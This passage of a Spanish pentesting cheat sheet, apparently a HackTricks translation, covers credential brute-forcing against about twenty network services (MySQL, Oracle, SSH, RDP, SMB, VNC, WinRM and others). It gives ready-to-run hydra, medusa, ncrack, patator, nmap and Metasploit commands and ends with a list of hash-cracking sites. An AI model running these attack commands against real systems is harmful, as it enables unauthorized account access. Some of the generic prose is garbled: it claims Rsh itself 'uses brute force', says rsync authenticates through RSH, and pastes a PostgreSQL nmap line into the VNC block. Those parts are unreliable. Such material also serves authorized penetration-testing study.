Sin embargo, al igual que cualquier otra base de datos, Mongo también puede ser vulnerable a ataques de fuerza bruta. La fuerza bruta es un método de ataque en el que un hacker intenta adivinar la contraseña correcta probando diferentes combinaciones hasta encontrar la correcta.

Para proteger una base de datos Mongo contra ataques de fuerza bruta, es importante seguir algunas buenas prácticas de seguridad. Estas incluyen:

1. Utilizar contraseñas fuertes: Asegúrese de utilizar contraseñas largas y complejas que sean difíciles de adivinar. Evite contraseñas comunes o predecibles.

2. Limitar el acceso remoto: Restrinja el acceso remoto a la base de datos Mongo solo a las direcciones IP autorizadas. Esto ayudará a prevenir ataques desde ubicaciones no autorizadas.

3. Implementar bloqueo de cuentas: Configure un mecanismo de bloqueo de cuentas después de un número determinado de intentos fallidos de inicio de sesión. Esto dificultará los ataques de fuerza bruta al limitar el número de intentos permitidos.

4. Actualizar regularmente: Mantenga su base de datos Mongo actualizada con las últimas versiones y parches de seguridad. Esto ayudará a proteger contra vulnerabilidades conocidas.

5. Monitorear y registrar: Implemente un sistema de monitoreo y registro para detectar y registrar intentos de inicio de sesión fallidos o actividades sospechosas. Esto le permitirá identificar y responder rápidamente a posibles ataques.

Siguiendo estas prácticas de seguridad, puede ayudar a proteger su base de datos Mongo contra ataques de fuerza bruta y mantener sus datos seguros.
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
```
### MySQL

MySQL es un sistema de gestión de bases de datos relacional de código abierto ampliamente utilizado. Es conocido por su rendimiento, confiabilidad y facilidad de uso. MySQL utiliza el lenguaje de consulta estructurado (SQL) para administrar y manipular los datos almacenados en la base de datos.

#### Ataques de fuerza bruta contra MySQL

Un ataque de fuerza bruta es un método utilizado por los hackers para descubrir contraseñas o claves de acceso a través de la prueba sistemática de todas las combinaciones posibles. En el caso de MySQL, un ataque de fuerza bruta implica intentar adivinar la contraseña de un usuario o una cuenta de administrador.

Existen varias herramientas y técnicas disponibles para llevar a cabo un ataque de fuerza bruta contra MySQL. Algunas de las más comunes incluyen:

- **Hydra**: una herramienta de línea de comandos que puede realizar ataques de fuerza bruta contra varios protocolos, incluido MySQL.
- **Medusa**: una herramienta similar a Hydra que también puede realizar ataques de fuerza bruta contra MySQL.
- **Diccionarios de contraseñas**: estos archivos contienen una lista de contraseñas comunes que se utilizan para probar en un ataque de fuerza bruta.

Es importante tener en cuenta que los ataques de fuerza bruta son ilegales y están sujetos a sanciones legales. Solo se deben realizar pruebas de penetración en sistemas y redes autorizadas y con el consentimiento del propietario.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql
```
# Fuerza bruta

La fuerza bruta es una técnica comúnmente utilizada en el campo de la seguridad informática para descifrar contraseñas o encontrar información sensible mediante la prueba exhaustiva de todas las posibles combinaciones. En el contexto de OracleSQL, la fuerza bruta se puede utilizar para intentar adivinar contraseñas de usuarios o nombres de esquemas.

## Herramientas y recursos

Existen varias herramientas y recursos disponibles para llevar a cabo ataques de fuerza bruta en OracleSQL. Algunas de las herramientas más populares incluyen:

- **Hydra**: una herramienta de código abierto que admite ataques de fuerza bruta en varios protocolos, incluido OracleSQL.
- **Metasploit**: un marco de pruebas de penetración que incluye módulos para realizar ataques de fuerza bruta en OracleSQL.
- **Ncrack**: una herramienta de código abierto diseñada específicamente para realizar ataques de fuerza bruta en servicios de red, incluido OracleSQL.

Además de estas herramientas, también es posible desarrollar scripts personalizados utilizando lenguajes de programación como Python o Ruby para llevar a cabo ataques de fuerza bruta en OracleSQL.

## Consideraciones de seguridad

Es importante tener en cuenta que el uso de la fuerza bruta para acceder a sistemas o información sin autorización es ilegal y puede tener consecuencias legales graves. Solo se debe utilizar esta técnica con el permiso explícito del propietario del sistema o la información.

Además, es importante implementar medidas de seguridad adecuadas para proteger los sistemas de OracleSQL contra ataques de fuerza bruta. Algunas de estas medidas incluyen:

- Utilizar contraseñas fuertes y complejas que sean difíciles de adivinar.
- Implementar bloqueos de cuenta después de un número determinado de intentos fallidos de inicio de sesión.
- Mantener el software de OracleSQL actualizado con los últimos parches de seguridad.
- Utilizar firewalls y otras soluciones de seguridad para proteger los sistemas de OracleSQL de ataques externos.

## Conclusión

La fuerza bruta es una técnica poderosa pero peligrosa que puede ser utilizada para comprometer la seguridad de sistemas de OracleSQL. Es importante comprender los riesgos asociados con esta técnica y tomar las medidas adecuadas para proteger los sistemas contra ataques de fuerza bruta.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
```
Para utilizar **oracle_login** con **patator**, necesitas **instalar**:
```bash
pip3 install cx_Oracle --upgrade
```
[Fuerza bruta de hash de OracleSQL sin conexión](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versiones 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** y **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

El ataque de fuerza bruta es una técnica comúnmente utilizada en el hacking para obtener acceso no autorizado a cuentas de correo electrónico. POP (Post Office Protocol) es un protocolo utilizado para recibir correos electrónicos de un servidor de correo remoto. 

En un ataque de fuerza bruta contra POP, un hacker intenta adivinar la contraseña correcta probando diferentes combinaciones de contraseñas hasta encontrar la correcta. Esto se logra utilizando herramientas automatizadas que prueban miles o incluso millones de combinaciones en poco tiempo.

Es importante tener en cuenta que los ataques de fuerza bruta son ilegales y están sujetos a sanciones legales. Solo se deben realizar pruebas de penetración en sistemas autorizados y con el consentimiento del propietario del sistema.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
```
### PostgreSQL

PostgreSQL es un sistema de gestión de bases de datos relacional de código abierto y altamente escalable. Es ampliamente utilizado en aplicaciones web y empresariales debido a su capacidad para manejar grandes volúmenes de datos y su soporte para consultas complejas.

Una técnica común utilizada en el hacking es el ataque de fuerza bruta, que consiste en probar todas las combinaciones posibles de contraseñas hasta encontrar la correcta. Esto se puede hacer utilizando herramientas como Hydra o Medusa, que automatizan el proceso de prueba de contraseñas.

Sin embargo, es importante tener en cuenta que el uso de fuerza bruta para acceder a sistemas o cuentas sin autorización es ilegal y está sujeto a sanciones legales. Por lo tanto, siempre es recomendable obtener permiso explícito antes de realizar cualquier tipo de prueba de penetración o hacking ético.

Además, es importante tener en cuenta que la fuerza bruta puede ser un proceso lento y consumir muchos recursos, especialmente cuando se trata de contraseñas largas o complejas. Por lo tanto, es recomendable utilizar otras técnicas de hacking, como la ingeniería social o la explotación de vulnerabilidades, antes de recurrir a la fuerza bruta.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```
### PPTP

Puedes descargar el paquete `.deb` para instalar desde [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

El Protocolo de Escritorio Remoto (RDP, por sus siglas en inglés) es un protocolo de red desarrollado por Microsoft que permite a los usuarios controlar y acceder a un equipo remoto a través de una conexión de red. RDP utiliza el puerto 3389 por defecto y es ampliamente utilizado para la administración remota de sistemas Windows.

#### Ataques de fuerza bruta contra RDP

Los ataques de fuerza bruta contra RDP son una técnica común utilizada por los hackers para intentar adivinar las credenciales de inicio de sesión de un sistema remoto. Consiste en probar diferentes combinaciones de nombres de usuario y contraseñas hasta encontrar las correctas.

Existen varias herramientas disponibles que automatizan este proceso, como Hydra, Medusa y Ncrack. Estas herramientas pueden probar miles de combinaciones por segundo, lo que las hace muy efectivas para romper contraseñas débiles.

Para protegerse contra los ataques de fuerza bruta en RDP, se recomienda seguir las siguientes medidas de seguridad:

- Utilizar contraseñas fuertes y únicas para las cuentas de usuario.
- Habilitar la autenticación de dos factores para agregar una capa adicional de seguridad.
- Configurar un cortafuegos para bloquear direcciones IP sospechosas después de varios intentos fallidos de inicio de sesión.
- Cambiar el puerto predeterminado de RDP para dificultar los ataques automatizados.
- Mantener el sistema operativo y el software actualizados con los últimos parches de seguridad.

Al implementar estas medidas, se puede reducir significativamente el riesgo de un ataque de fuerza bruta exitoso contra RDP.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```
# Fuerza bruta

La fuerza bruta es una técnica comúnmente utilizada en el hacking para descifrar contraseñas o claves de cifrado mediante la prueba exhaustiva de todas las posibles combinaciones. En el contexto de Redis, la fuerza bruta se puede utilizar para intentar adivinar contraseñas de acceso a una instancia de Redis.

## Herramientas de fuerza bruta

Existen varias herramientas disponibles para llevar a cabo ataques de fuerza bruta en Redis. Algunas de las herramientas más populares incluyen:

- **Hydra**: una herramienta de fuerza bruta muy conocida y ampliamente utilizada que admite múltiples protocolos, incluido Redis.
- **Medusa**: otra herramienta de fuerza bruta que puede utilizarse para atacar contraseñas de Redis.
- **Ncrack**: una herramienta de autenticación en red que también puede utilizarse para realizar ataques de fuerza bruta en Redis.

## Métodos de protección contra ataques de fuerza bruta

Para proteger una instancia de Redis contra ataques de fuerza bruta, se pueden implementar las siguientes medidas:

- **Contraseñas fuertes**: utilizar contraseñas largas y complejas dificulta enormemente los ataques de fuerza bruta.
- **Bloqueo de IP**: configurar Redis para bloquear automáticamente las direcciones IP después de un número determinado de intentos fallidos de autenticación.
- **Limitación de intentos**: implementar un mecanismo que limite el número de intentos de autenticación permitidos en un período de tiempo determinado.
- **Autenticación adicional**: utilizar mecanismos de autenticación adicionales, como el uso de claves SSH o certificados SSL/TLS, para agregar una capa adicional de seguridad.

Es importante tener en cuenta que ninguna medida de protección es infalible y siempre existe la posibilidad de que un ataque de fuerza bruta tenga éxito. Por lo tanto, es fundamental mantenerse actualizado sobre las últimas vulnerabilidades y parches de seguridad, así como implementar medidas de seguridad adicionales, como el monitoreo de registros y la detección de intrusiones, para detectar y mitigar posibles ataques.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
```
### Rexec

Rexec, también conocido como Remote Execution Service, es un protocolo de red que permite a un usuario ejecutar comandos en un sistema remoto. Este protocolo se utiliza comúnmente en entornos de red para administrar sistemas y realizar tareas de administración remota.

El ataque de fuerza bruta en Rexec implica intentar adivinar las credenciales de inicio de sesión de un sistema remoto mediante la prueba de diferentes combinaciones de nombres de usuario y contraseñas. Este método es efectivo cuando se utilizan credenciales débiles o cuando no se han implementado medidas de seguridad adecuadas.

Para llevar a cabo un ataque de fuerza bruta en Rexec, se utilizan herramientas como Hydra o Medusa, que automatizan el proceso de prueba de credenciales. Estas herramientas intentan diferentes combinaciones de nombres de usuario y contraseñas hasta encontrar las correctas.

Es importante tener en cuenta que realizar un ataque de fuerza bruta en un sistema sin permiso es ilegal y puede tener consecuencias legales graves. Solo se debe realizar un ataque de fuerza bruta en un sistema con el consentimiento explícito del propietario y como parte de una evaluación de seguridad autorizada, como una prueba de penetración.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin (Remote Login) es un protocolo de red que permite a un usuario iniciar sesión en un sistema remoto a través de una red. Este protocolo utiliza el puerto 513 y se basa en la autenticación mediante contraseña.

El ataque de fuerza bruta en Rlogin implica intentar adivinar la contraseña correcta probando diferentes combinaciones de contraseñas hasta encontrar la correcta. Este tipo de ataque puede ser automatizado utilizando herramientas como Hydra o Medusa.

Es importante tener en cuenta que el uso de fuerza bruta para acceder a sistemas remotos sin autorización es ilegal y está sujeto a sanciones legales. Solo se debe realizar este tipo de ataque con el permiso explícito del propietario del sistema y como parte de una evaluación de seguridad autorizada, como una prueba de penetración.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

El Rsh (Remote Shell) es un protocolo de red que permite a un usuario ejecutar comandos en un sistema remoto. Es similar al comando `ssh`, pero sin la autenticación segura. El Rsh utiliza un enfoque de fuerza bruta para adivinar las credenciales de inicio de sesión del sistema remoto.

La técnica de fuerza bruta consiste en probar todas las combinaciones posibles de nombres de usuario y contraseñas hasta encontrar la correcta. Esto se logra mediante el uso de herramientas automatizadas que generan y prueban estas combinaciones de forma rápida y eficiente.

Sin embargo, el uso de la técnica de fuerza bruta para acceder a sistemas remotos está altamente desaconsejado, ya que es una violación de la privacidad y puede ser ilegal. Además, muchos sistemas tienen medidas de seguridad en su lugar para detectar y bloquear intentos de fuerza bruta.

Es importante tener en cuenta que el Rsh es un protocolo obsoleto y no se recomienda su uso en entornos de producción. En su lugar, se recomienda utilizar protocolos más seguros como `ssh` para acceder de forma remota a sistemas.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync es una herramienta de sincronización de archivos que se utiliza comúnmente en sistemas Unix y Linux. Permite la transferencia eficiente de datos entre sistemas locales y remotos a través de una conexión segura. Rsync utiliza el protocolo RSH (Remote Shell) para autenticarse en el sistema remoto y realizar la transferencia de archivos.

El protocolo RSH utiliza autenticación basada en contraseña, lo que lo hace vulnerable a ataques de fuerza bruta. Un ataque de fuerza bruta consiste en probar todas las combinaciones posibles de contraseñas hasta encontrar la correcta. Esto puede llevar mucho tiempo y esfuerzo, pero puede ser efectivo si la contraseña es débil o predecible.

Para llevar a cabo un ataque de fuerza bruta contra Rsync, se pueden utilizar herramientas como RSH-Grind. Estas herramientas automatizan el proceso de prueba de contraseñas y pueden probar miles de combinaciones en poco tiempo. Es importante tener en cuenta que realizar un ataque de fuerza bruta sin permiso explícito es ilegal y puede tener consecuencias legales graves.

Siempre es recomendable utilizar contraseñas seguras y complejas para proteger los sistemas y evitar ataques de fuerza bruta. Además, se deben implementar medidas adicionales de seguridad, como el bloqueo de direcciones IP después de varios intentos fallidos de autenticación, para protegerse contra este tipo de ataques.
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

El Protocolo de Transmisión en Tiempo Real (RTSP, por sus siglas en inglés) es un protocolo de red utilizado para controlar la transmisión de medios en tiempo real, como audio y video, a través de redes IP. RTSP permite a los clientes controlar la reproducción de medios, como reproducir, pausar, detener y avanzar rápidamente.

#### Ataques de fuerza bruta contra RTSP

Los ataques de fuerza bruta son una técnica común utilizada por los hackers para intentar adivinar contraseñas o claves de acceso. En el caso de RTSP, un ataque de fuerza bruta implica intentar todas las combinaciones posibles de contraseñas hasta encontrar la correcta.

Existen varias herramientas disponibles para llevar a cabo ataques de fuerza bruta contra servidores RTSP. Estas herramientas automatizan el proceso de intentar diferentes combinaciones de contraseñas a alta velocidad.

Para protegerse contra los ataques de fuerza bruta en RTSP, es importante seguir buenas prácticas de seguridad, como utilizar contraseñas fuertes y cambiarlas regularmente. Además, se recomienda implementar medidas de seguridad adicionales, como bloquear direcciones IP después de un número determinado de intentos fallidos de inicio de sesión.

En resumen, RTSP es un protocolo utilizado para la transmisión de medios en tiempo real, y los ataques de fuerza bruta son una técnica común utilizada por los hackers para intentar adivinar contraseñas en servidores RTSP. Es importante tomar medidas de seguridad adecuadas para protegerse contra estos ataques.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SNMP

El Protocolo Simple de Administración de Red (SNMP, por sus siglas en inglés) es un protocolo de red utilizado para administrar y supervisar dispositivos en una red. SNMP permite a los administradores de red recopilar información y controlar dispositivos de red, como routers, switches y servidores.

El protocolo SNMP utiliza una estructura de datos jerárquica llamada MIB (Base de Información de Administración) para organizar y almacenar información sobre los dispositivos de red. Los administradores pueden utilizar herramientas de gestión de red para consultar y modificar los valores de los objetos MIB en los dispositivos SNMP.

Una técnica común utilizada en el hacking es el ataque de fuerza bruta, que implica probar todas las combinaciones posibles de contraseñas hasta encontrar la correcta. Esto se puede aplicar al protocolo SNMP para intentar adivinar la cadena de comunidad, que es una especie de contraseña utilizada para autenticar las solicitudes SNMP.

Los hackers pueden utilizar herramientas de fuerza bruta para probar diferentes cadenas de comunidad y tratar de obtener acceso no autorizado a los dispositivos SNMP. Esto puede permitirles recopilar información confidencial o incluso controlar los dispositivos de red de forma remota.

Para protegerse contra los ataques de fuerza bruta en SNMP, es importante utilizar cadenas de comunidad fuertes y únicas. Además, se deben implementar medidas de seguridad adicionales, como el filtrado de direcciones IP y la autenticación de usuarios, para evitar el acceso no autorizado a los dispositivos SNMP.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB (Server Message Block) es un protocolo de red utilizado para compartir archivos, impresoras y otros recursos en una red local. Es ampliamente utilizado en entornos de Windows y permite a los usuarios acceder y administrar recursos compartidos en una red.

El ataque de fuerza bruta es una técnica comúnmente utilizada para comprometer sistemas que utilizan el protocolo SMB. Consiste en probar todas las posibles combinaciones de contraseñas hasta encontrar la correcta. Esto se logra utilizando herramientas automatizadas que intentan diferentes combinaciones de contraseñas a una velocidad muy alta.

El ataque de fuerza bruta puede ser efectivo si se utilizan contraseñas débiles o si no se implementan medidas de seguridad adecuadas, como bloquear las cuentas después de un número determinado de intentos fallidos. Para protegerse contra este tipo de ataque, es importante utilizar contraseñas seguras y establecer políticas de bloqueo de cuentas.

Además del ataque de fuerza bruta, existen otras técnicas de hacking que pueden comprometer sistemas que utilizan el protocolo SMB, como la explotación de vulnerabilidades conocidas o el uso de herramientas de hacking específicas. Es importante estar al tanto de las últimas vulnerabilidades y parches de seguridad para protegerse contra estos ataques.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
```
El protocolo SMTP (Simple Mail Transfer Protocol) es un protocolo de red utilizado para enviar correos electrónicos a través de Internet. SMTP es un protocolo de texto sin estado que se basa en el modelo cliente-servidor. El cliente SMTP se utiliza para enviar mensajes de correo electrónico al servidor SMTP, que luego se encarga de entregar el mensaje al destinatario.

#### Ataques de fuerza bruta contra SMTP

Un ataque de fuerza bruta contra SMTP es un método utilizado por los hackers para obtener acceso no autorizado a una cuenta de correo electrónico. En este tipo de ataque, el hacker intenta adivinar la contraseña correcta probando diferentes combinaciones de contraseñas hasta encontrar la correcta.

Existen varias herramientas y recursos disponibles para llevar a cabo un ataque de fuerza bruta contra SMTP. Estas herramientas automatizan el proceso de adivinar contraseñas y pueden probar miles de combinaciones en poco tiempo.

#### Protección contra ataques de fuerza bruta

Para protegerse contra los ataques de fuerza bruta contra SMTP, es importante seguir algunas prácticas recomendadas:

- Utilizar contraseñas fuertes: Las contraseñas deben ser largas, complejas y únicas para cada cuenta de correo electrónico.
- Implementar bloqueo de cuentas: Después de un número determinado de intentos fallidos de inicio de sesión, se debe bloquear la cuenta durante un período de tiempo para evitar ataques de fuerza bruta.
- Utilizar autenticación de dos factores: La autenticación de dos factores agrega una capa adicional de seguridad al requerir un segundo factor de autenticación, como un código enviado al teléfono móvil del usuario, además de la contraseña.
- Mantener el software actualizado: Es importante mantener el software de correo electrónico y los sistemas operativos actualizados para protegerse contra vulnerabilidades conocidas.

Al seguir estas prácticas recomendadas, se puede reducir significativamente el riesgo de un ataque de fuerza bruta contra SMTP y proteger la integridad de las cuentas de correo electrónico.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
```
### SOCKS

SOCKS (Socket Secure) es un protocolo de red que permite a los usuarios enviar y recibir datos a través de un servidor proxy. A diferencia de otros protocolos de proxy, SOCKS no está diseñado para inspeccionar o filtrar el tráfico de red, sino que actúa como un intermediario entre el cliente y el servidor.

El uso de SOCKS es común en el ámbito de la seguridad informática, ya que permite a los usuarios ocultar su dirección IP real y enrutar su tráfico a través de un servidor proxy. Esto puede ser útil para eludir restricciones geográficas, acceder a contenido bloqueado o proteger la privacidad en línea.

Una técnica común utilizada en el hacking es el ataque de fuerza bruta, que consiste en probar todas las combinaciones posibles de contraseñas hasta encontrar la correcta. SOCKS puede ser utilizado en este tipo de ataques para ocultar la dirección IP del atacante y evitar ser detectado.

Es importante tener en cuenta que el uso de SOCKS para actividades ilegales o no autorizadas está estrictamente prohibido y puede tener consecuencias legales graves. Siempre es recomendable utilizar SOCKS de manera ética y legal, respetando la privacidad y los derechos de los demás.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
```
### SSH

SSH (Secure Shell) es un protocolo de red que permite a los usuarios acceder y administrar de forma segura un sistema remoto. Utiliza técnicas de cifrado para proteger la comunicación entre el cliente y el servidor, evitando así que los datos sean interceptados o modificados por terceros.

El ataque de fuerza bruta es una técnica comúnmente utilizada para intentar obtener acceso no autorizado a un sistema SSH. Consiste en probar diferentes combinaciones de nombres de usuario y contraseñas hasta encontrar las credenciales correctas. Los atacantes suelen utilizar diccionarios de contraseñas predefinidos o generados automáticamente para realizar este tipo de ataque.

Para protegerse contra los ataques de fuerza bruta en SSH, es importante seguir algunas buenas prácticas de seguridad. Estas incluyen:

- Utilizar contraseñas seguras y difíciles de adivinar.
- Configurar el servidor SSH para permitir solo conexiones desde direcciones IP específicas.
- Limitar el número de intentos de inicio de sesión fallidos antes de bloquear temporalmente la cuenta.
- Utilizar autenticación de dos factores para agregar una capa adicional de seguridad.

Además, es recomendable mantener el software SSH actualizado con las últimas correcciones de seguridad y monitorear los registros de actividad en busca de signos de intentos de fuerza bruta.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
```
#### Claves SSH débiles / PRNG predecible de Debian
Algunos sistemas tienen fallos conocidos en la semilla aleatoria utilizada para generar material criptográfico. Esto puede resultar en un espacio de claves dramáticamente reducido que puede ser atacado por fuerza bruta con herramientas como [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). También están disponibles conjuntos pregenerados de claves débiles, como [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### SQL Server
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### Telnet

Telnet es un protocolo de red que permite la comunicación bidireccional entre dos dispositivos a través de una conexión TCP/IP. Es comúnmente utilizado para acceder y administrar dispositivos remotos, como servidores y enrutadores.

El ataque de fuerza bruta en Telnet implica intentar adivinar las credenciales de acceso al dispositivo objetivo probando diferentes combinaciones de nombres de usuario y contraseñas. Este método es efectivo cuando el dispositivo objetivo tiene credenciales débiles o predeterminadas.

Para llevar a cabo un ataque de fuerza bruta en Telnet, se utilizan herramientas como Hydra o Medusa, que automatizan el proceso de prueba de credenciales. Estas herramientas intentan diferentes combinaciones de nombres de usuario y contraseñas hasta encontrar las correctas.

Es importante tener en cuenta que el uso de fuerza bruta para acceder a dispositivos o sistemas sin autorización es ilegal y puede tener consecuencias legales graves. Solo se debe realizar un ataque de fuerza bruta en Telnet con el permiso explícito del propietario del dispositivo o sistema.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
```
### VNC

VNC (Virtual Network Computing) es un protocolo que permite controlar de forma remota un ordenador a través de una red. Es ampliamente utilizado para acceder y administrar sistemas de forma remota.

#### Ataques de fuerza bruta contra VNC

Un ataque de fuerza bruta contra VNC implica intentar adivinar la contraseña de acceso al sistema mediante la prueba de diferentes combinaciones de contraseñas. Este tipo de ataque puede ser efectivo si la contraseña es débil o si no se han tomado medidas de seguridad adicionales.

#### Herramientas de fuerza bruta para VNC

Existen varias herramientas disponibles para llevar a cabo ataques de fuerza bruta contra VNC. Algunas de las herramientas más populares incluyen Hydra, Medusa y Ncrack. Estas herramientas automatizan el proceso de prueba de contraseñas y pueden probar miles de combinaciones en poco tiempo.

#### Mitigación de ataques de fuerza bruta contra VNC

Para mitigar los ataques de fuerza bruta contra VNC, se recomienda seguir las siguientes medidas de seguridad:

- Utilizar contraseñas fuertes y únicas para el acceso a VNC.
- Implementar medidas de bloqueo después de un número determinado de intentos fallidos de inicio de sesión.
- Utilizar una VPN para cifrar la conexión entre el cliente y el servidor VNC.
- Limitar el acceso a VNC solo a direcciones IP específicas o a través de una red privada virtual (VPN).
- Mantener el software VNC actualizado con las últimas correcciones de seguridad.

Al seguir estas medidas de seguridad, se puede reducir significativamente el riesgo de un ataque de fuerza bruta exitoso contra VNC.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm es un protocolo de administración remota desarrollado por Microsoft que permite a los administradores controlar y administrar sistemas Windows de forma remota. Winrm utiliza el protocolo SOAP (Simple Object Access Protocol) sobre HTTP o HTTPS para la comunicación entre el cliente y el servidor.

El ataque de fuerza bruta en Winrm implica intentar adivinar las credenciales de inicio de sesión de un sistema Windows utilizando un método de prueba y error. Esto se logra enviando múltiples combinaciones de nombres de usuario y contraseñas hasta que se encuentra una coincidencia exitosa.

Para llevar a cabo un ataque de fuerza bruta en Winrm, se pueden utilizar herramientas como Hydra o Medusa, que automatizan el proceso de envío de solicitudes de autenticación con diferentes combinaciones de credenciales.

Es importante tener en cuenta que los ataques de fuerza bruta son ilegales y están estrictamente prohibidos sin el consentimiento explícito del propietario del sistema objetivo. Estos ataques pueden causar daños graves y violar la privacidad y seguridad de los sistemas y datos.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y automatizar fácilmente flujos de trabajo impulsados por las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Local

### Bases de datos de cracking en línea

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 y SHA1)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, capturas WPA2 y archivos MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hashes)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashes y hashes de archivos)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
